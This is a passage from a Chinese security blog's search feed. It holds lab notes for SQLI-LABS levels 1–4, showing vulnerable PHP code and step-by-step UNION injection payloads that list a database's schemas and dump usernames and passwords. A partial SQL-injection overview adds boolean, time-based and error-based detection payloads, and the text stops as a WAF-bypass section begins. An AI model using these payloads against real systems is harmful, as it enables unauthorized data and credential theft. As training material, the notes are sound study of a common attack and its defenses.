<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>NO.3 XSS渗透与攻防</title>
    <link href="/2025/02/05/XSS%E6%B8%97%E9%80%8F%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <url>/2025/02/05/XSS%E6%B8%97%E9%80%8F%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    
    <content type="html"><![CDATA[<p>正在编写中 ……</p>]]></content>
    
    
    <categories>
      
      <category>渗透与防御</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI-LABS 练习笔记</title>
    <link href="/2025/02/05/sqli-labs-notes/"/>
    <url>/2025/02/05/sqli-labs-notes/</url>
    
    <content type="html"><![CDATA[<p>由于个人水平有限，文中难免存在不足，欢迎各位师傅不吝赐教、指出问题，期待我们共同进步！</p><h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><p>我的靶机基于小皮面板在本机环境下运行，如有需要可查看其他师傅的文章。</p><p>在关卡源码中找到要执行的SQL语句，在下面加入以下代码，方便我们理解执行的SQL命令（熟练掌握后便无需再查看，毕竟在实战场景中无法看到执行语句，只能依靠经验判断）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$sql</span>&lt;br&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/05/sqli-labs-notes/image-20250205145136337.png"></p><p><img src="/2025/02/05/sqli-labs-notes/image-20250205172518851.png" alt="输出执行的sql语句"></p><h1 id="Less-1-基于错误的GET单引号注入"><a href="#Less-1-基于错误的GET单引号注入" class="headerlink" title="Less-1 基于错误的GET单引号注入"></a>Less-1 基于错误的GET单引号注入</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li>判断闭合方式</li></ol><ul><li>payload: <code>?id=1&#39;</code></li><li>报错信息：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></li><li>可以看到<code>&#39;1&#39;</code>这样的形式，说明是单引号闭合</li></ul><ol start="2"><li>判断字段数</li></ol><ul><li>payload: <code>?id=1&#39; order by 3--+</code>  正常</li><li>payload: <code>?id=1&#39; order by 4--+</code>  报错</li><li>说明字段数为3</li></ul><ol start="3"><li>判断显示位</li></ol><ul><li>payload: <code>?id=-1&#39; union select 1,2,3--+</code></li><li>页面显示2,3说明2,3为显示位</li></ul><ol start="4"><li>获取基本信息<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 数据库版本和用户<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,version(),user()--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 当前数据库</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br># 所有数据库<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># security库的所有表</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br># users表的所有字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 获取用户名和密码</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="Less-2-基于错误的GET数字型注入"><a href="#Less-2-基于错误的GET数字型注入" class="headerlink" title="Less-2 基于错误的GET数字型注入"></a>Less-2 基于错误的GET数字型注入</h1><h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><h2 id="注入步骤-1"><a href="#注入步骤-1" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li>判断闭合方式</li></ol><ul><li>payload: <code>?id=1&#39;</code></li><li>报错信息：显示语法错误，说明这里是数字型注入，不需要引号闭合</li></ul><ol start="2"><li>判断字段数</li></ol><ul><li>payload: <code>?id=1 order by 3</code>  正常</li><li>payload: <code>?id=1 order by 4</code>  报错</li><li>说明字段数为3</li></ul><ol start="3"><li>判断显示位</li></ol><ul><li>payload: <code>?id=-1 union select 1,2,3</code></li><li>页面显示2,3说明2,3为显示位</li></ul><ol start="4"><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 数据库版本和用户<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,version(),<span class="hljs-keyword">user</span>()<br><br># 当前数据库<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><br><br># 所有数据库<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<br><br># security库的所有表<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><br><br># users表的所有字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br><br># 获取用户名和密码<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li></ol><h1 id="Less-3-基于错误的GET单引号变形注入"><a href="#Less-3-基于错误的GET单引号变形注入" class="headerlink" title="Less-3 基于错误的GET单引号变形注入"></a>Less-3 基于错误的GET单引号变形注入</h1><h2 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="hljs-subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><h2 id="注入步骤-2"><a href="#注入步骤-2" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li>判断闭合方式</li></ol><ul><li>payload: <code>?id=1&#39;</code></li><li>报错信息显示<code>&#39;1&#39;)</code>，说明需要<code>&#39;)</code>闭合</li></ul><ol start="2"><li>判断字段数</li></ol><ul><li>payload: <code>?id=1&#39;) order by 3--+</code>  正常</li><li>payload: <code>?id=1&#39;) order by 4--+</code>  报错</li><li>说明字段数为3</li></ul><ol start="3"><li>判断显示位</li></ol><ul><li>payload: <code>?id=-1&#39;) union select 1,2,3--+</code></li><li>页面显示2,3说明2,3为显示位</li></ul><ol start="4"><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 数据库版本和用户<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,version(),user()--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 当前数据库</span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br># 所有数据库<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># security库的所有表</span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br># users表的所有字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 获取用户名和密码</span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="Less-4-基于错误的GET双引号注入"><a href="#Less-4-基于错误的GET双引号注入" class="headerlink" title="Less-4 基于错误的GET双引号注入"></a>Less-4 基于错误的GET双引号注入</h1><h2 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&quot;</span><span class="hljs-variable">$id</span><span class="hljs-string">&quot;) LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><h2 id="注入步骤-3"><a href="#注入步骤-3" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li>判断闭合方式</li></ol><ul><li>payload: <code>?id=1&quot;</code></li><li>报错信息显示<code>&quot;1&quot;)</code>，说明需要<code>&quot;)</code>闭合</li></ul><ol start="2"><li>判断字段数</li></ol><ul><li>payload: <code>?id=1&quot;) order by 3--+</code>  正常</li><li>payload: <code>?id=1&quot;) order by 4--+</code>  报错</li><li>说明字段数为3</li></ul><ol start="3"><li>判断显示位</li></ol><ul><li>payload: <code>?id=-1&quot;) union select 1,2,3--+</code></li><li>页面显示2,3说明2,3为显示位</li></ul><ol start="4"><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 数据库版本和用户<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,version(),user()--+<br><br># 当前数据库<br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br># 所有数据库<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+<br><br># security库的所有表<br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br># users表的所有字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+<br><br># 获取用户名和密码<br>?id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>Less-1 是单引号字符型注入</li><li>Less-2 是数字型注入</li><li>Less-3 是带括号的单引号字符型注入</li><li>Less-4 是带括号的双引号字符型注入</li></ul><p>关键在于：</p><ol><li>判断闭合方式</li><li>构造正确的payload</li><li>注意URL编码</li></ol><p>这些关卡都是基于错误的GET型注入，接下来还会有基于布尔盲注、时间盲注等其他类型，将在后续继续更新。</p><hr><blockquote><p>本文仅用于学习研究，切勿用于非法用途，否则后果自负。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>SQLI-LABS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NO.2 SQL注入渗透与攻防</title>
    <link href="/2025/02/04/SQL%E6%B3%A8%E5%85%A5%E6%B8%97%E9%80%8F%E4%B8%8E%E6%94%BB%E9%98%B2/"/>
    <url>/2025/02/04/SQL%E6%B3%A8%E5%85%A5%E6%B8%97%E9%80%8F%E4%B8%8E%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p><strong>正在编写中……</strong></p><span id="more"></span><h1 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>SQL注入是由于<a href="https://baike.baidu.com/item/web%20app/9475982">web应用程序</a>未正确验证用户输入，使得攻击者可以通过添加恶意的<a href="https://baike.baidu.com/item/sql%E8%AF%AD%E5%8F%A5?fromModule=lemma_search-box">SQL语句</a>来操纵数据库查询。</p><h2 id="成因分析"><a href="#成因分析" class="headerlink" title="成因分析"></a>成因分析</h2><ol><li>未对用户输入进行有效过滤</li><li>使用动态拼接SQL语句</li><li>未使用参数化查询</li><li>过于宽松的数据库权限</li><li>错误信息暴露过多细节</li></ol><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="MySQL基础"><a href="#MySQL基础" class="headerlink" title="MySQL基础"></a>MySQL基础</h3><p>MySQL默认包含以下数据库：</p><ul><li>sys</li><li>mysql</li><li>performance_schema</li><li>information_schema（5.0版本以上）</li></ul><h3 id="重要系统表"><a href="#重要系统表" class="headerlink" title="重要系统表"></a>重要系统表</h3><ol><li><p>SCHEMATA表</p><ul><li>存放数据库名信息</li><li>SCHEMA_NAME字段记录库名</li></ul></li><li><p>TABLES表</p><ul><li>TABLE_SCHEMA记录数据库名</li><li>TABLE_NAME记录表名</li></ul></li><li><p>COLUMNS表</p><ul><li>TABLE_SCHEMA记录数据库名</li><li>TABLE_NAME记录表名</li><li>COLUMN_NAME记录字段名</li></ul></li></ol><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ol><li><p>字符串处理</p><ul><li>concat()：字符串连接</li><li>substr()：截取字符串</li><li>length()：字符串长度</li><li>ascii()/ord()：字符转ASCII码</li></ul></li><li><p>系统信息</p><ul><li>version()：MySQL版本</li><li>user()：当前用户</li><li>database()：当前数据库</li><li>@@datadir：数据存储路径</li></ul></li></ol><h1 id="二、漏洞检测"><a href="#二、漏洞检测" class="headerlink" title="二、漏洞检测"></a>二、漏洞检测</h1><h2 id="注入点探测"><a href="#注入点探测" class="headerlink" title="注入点探测"></a>注入点探测</h2><h3 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h3><ol><li>GET参数</li><li>POST参数</li><li>Cookie</li><li>HTTP头</li><li>文件上传名</li></ol><h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><ol><li><p>数字型测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br><span class="hljs-operator">+</span><span class="hljs-number">1</span><br><span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure></li><li><p>字符型测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;and&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27;and&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br>&quot;and&quot;<span class="hljs-number">1</span>&quot;=&quot;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>搜索型测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; and 1=1 and &#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; and 1=2 and &#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="注入类型识别"><a href="#注入类型识别" class="headerlink" title="注入类型识别"></a>注入类型识别</h2><h3 id="Union注入检测"><a href="#Union注入检测" class="headerlink" title="Union注入检测"></a>Union注入检测</h3><ol><li><p>order by判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1#</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>#<br></code></pre></td></tr></table></figure></li><li><p>union select测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3#</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="布尔盲注检测"><a href="#布尔盲注检测" class="headerlink" title="布尔盲注检测"></a>布尔盲注检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),1,1))&gt;97#</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">5</span>#<br></code></pre></td></tr></table></figure><h3 id="时间盲注检测"><a href="#时间盲注检测" class="headerlink" title="时间盲注检测"></a>时间盲注检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(5)#</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> if(length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">5</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)#<br></code></pre></td></tr></table></figure><h3 id="报错注入检测"><a href="#报错注入检测" class="headerlink" title="报错注入检测"></a>报错注入检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>))#<br></code></pre></td></tr></table></figure><h2 id="自动化检测工具"><a href="#自动化检测工具" class="headerlink" title="自动化检测工具"></a>自动化检测工具</h2><ul><li>SQLmap</li><li>AWVS</li><li>Burp Suite</li><li>Nmap</li></ul><h1 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h1><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><ol><li><p>数据泄露</p><ul><li>用户信息泄露</li><li>业务数据泄露</li><li>系统配置泄露</li></ul></li><li><p>数据完整性破坏</p><ul><li>篡改数据</li><li>删除数据</li><li>插入恶意数据</li></ul></li></ol><h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><ol><li><p>权限提升</p><ul><li>获取管理员权限</li><li>绕过登录认证</li><li>执行高权限操作</li></ul></li><li><p>服务器控制</p><ul><li>读取系统文件</li><li>写入Webshell</li><li>获取系统权限</li></ul></li></ol><h2 id="业务影响"><a href="#业务影响" class="headerlink" title="业务影响"></a>业务影响</h2><ol><li>服务中断</li><li>信息泄露</li><li>声誉损失</li><li>经济损失</li></ol><h1 id="四、防御修复"><a href="#四、防御修复" class="headerlink" title="四、防御修复"></a>四、防御修复</h1><h2 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h2><h3 id="1-参数化查询"><a href="#1-参数化查询" class="headerlink" title="1. 参数化查询"></a>1. 参数化查询</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// PHP PDO示例</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$id</span>]);<br><br><span class="hljs-comment">// Java PreparedStatement示例</span><br>PreparedStatement stmt = conn.<span class="hljs-title function_ invoke__">prepareStatement</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br>stmt.<span class="hljs-title function_ invoke__">setInt</span>(<span class="hljs-number">1</span>, id);<br></code></pre></td></tr></table></figure><h3 id="2-输入验证"><a href="#2-输入验证" class="headerlink" title="2. 输入验证"></a>2. 输入验证</h3><ul><li>类型检查</li><li>长度限制</li><li>格式验证</li><li>白名单过滤</li></ul><h3 id="3-错误处理"><a href="#3-错误处理" class="headerlink" title="3. 错误处理"></a>3. 错误处理</h3><ul><li>统一错误页面</li><li>禁用错误显示</li><li>日志记录</li></ul><h2 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h2><h3 id="1-权限控制"><a href="#1-权限控制" class="headerlink" title="1. 权限控制"></a>1. 权限控制</h3><ul><li>最小权限原则</li><li>账号权限分离</li><li>定期审计</li></ul><h3 id="2-安全设置"><a href="#2-安全设置" class="headerlink" title="2. 安全设置"></a>2. 安全设置</h3><ul><li>修改默认端口</li><li>禁用危险函数</li><li>启用安全日志</li></ul><h2 id="部署防护"><a href="#部署防护" class="headerlink" title="部署防护"></a>部署防护</h2><h3 id="1-WAF配置"><a href="#1-WAF配置" class="headerlink" title="1. WAF配置"></a>1. WAF配置</h3><ul><li>SQL注入规则</li><li>特征识别</li><li>行为分析</li></ul><h3 id="2-监控告警"><a href="#2-监控告警" class="headerlink" title="2. 监控告警"></a>2. 监控告警</h3><ul><li>异常访问监控</li><li>数据库审计</li><li>实时告警</li></ul><h1 id="五、绕过技术"><a href="#五、绕过技术" class="headerlink" title="五、绕过技术"></a>五、绕过技术</h1><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="1-注释符变换"><a href="#1-注释符变换" class="headerlink" title="1. 注释符变换"></a>1. 